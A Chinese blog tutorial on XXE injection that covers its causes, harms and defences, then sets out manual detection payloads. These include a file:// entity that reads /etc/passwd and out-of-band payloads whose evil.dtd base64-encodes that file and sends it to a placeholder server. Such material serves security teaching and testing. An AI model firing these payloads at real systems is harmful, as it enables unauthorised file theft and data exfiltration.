---
title: 【XXE】XXE(一)
categories:
  - 渗透测试
  - XXE
tags:
description: >-
  声明：文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由用户承担全部法律及连带责任，文章作者不承担任何法律及连带责任。
comments: true
abbrlink: bc9f160b
date: 2025-08-31 04:08:19
top:
---

## xml外部实体注入漏洞

服务端接收和解析了来自用户端的xml数据,而又没有做严格的安全控制,从而导致xml外部实体注入
XXE（XML External Entity）漏洞，全称 XML 外部实体注入漏洞，是一种针对解析 XML 输入的应用程序的安全攻击。其核心原理在于恶意利用 XML 解析器处理外部实体引用的功能，导致应用程序执行非预期的、有害的操作，例如读取敏感文件、发起网络请求、执行服务端请求伪造（SSRF）甚至拒绝服务（DoS）攻击。

## XXE危害

1.	文件读取
2.	读取内网文件，探测端口
3.	XML炸弹拒绝服务攻击

## XXE预防

1.	禁用外部实体，但是只禁用外部实体有可能被XML炸弹攻击
2.	禁用DTD，能杜绝100%的外部实体攻击，如果需要文档结构验证可以升级为XSD（XML Schema）
3.	升级php版本
过滤关键字<!DOCTYPE、<!ENTITY SYSTEM、PUBLIC
4.	白名单
5.	Fortify等扫描工具可以扫源码

## 手动检测方法

1. 基础探测（响应回显型）
Payload 1：内部实体测试
```
<?xml version="1.0"?>
<!DOCTYPE test [ 
  <!ENTITY demo "XXE_VALID"> 
]>
<root>&demo;</root>
•	检测点：响应中出现XXE_VALID说明实体解析开启
```
Payload 2：外部实体测试
```
<?xml version="1.0"?>
<!DOCTYPE test [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>
```
•	成功标志：
o	响应中包含文件内容
o	返回错误信息如no such file（泄露路径）
o	HTTP 500错误（文件含特殊字符破坏XML结构）
2. 盲测（无回显型）
Payload 3：带外检测（OOB）
```
<!DOCTYPE test [
  <!ENTITY % xxe SYSTEM "http://YOUR-SERVER.com/oob">
  %xxe;
]>
```
Payload 4：多级外带数据
```
<!DOCTYPE data [
  <!ENTITY % dtd SYSTEM "http://YOUR-SERVER.com/evil.dtd">
  %dtd;
]>
<data>&exfil;</data>
evil.dtd内容：
dtd
<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % exfil "<!ENTITY exfil SYSTEM 'http://YOUR-SERVER.com/?data=%file;'>">
```




本文参考：
